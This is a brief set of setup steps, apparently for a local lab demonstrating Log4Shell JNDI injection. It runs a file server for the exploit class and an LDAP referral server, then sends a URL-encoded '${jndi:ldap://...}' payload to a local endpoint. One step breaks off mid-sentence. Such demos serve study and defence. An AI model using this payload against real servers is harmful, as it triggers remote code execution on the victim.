- Run `mvm clean compile`. This 
- Run the Spring boot application class FileServerApplication to launch a fileserver which serves the exploitable code.
- Run the LDAPRefServer and pass this argument: "http://127.0.0.1:8888/#Exploit"
- Open a browser and go to this URL: http://localhost:8080/seeforyourself?loggedData=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1%3A1389%2FExploit%7D
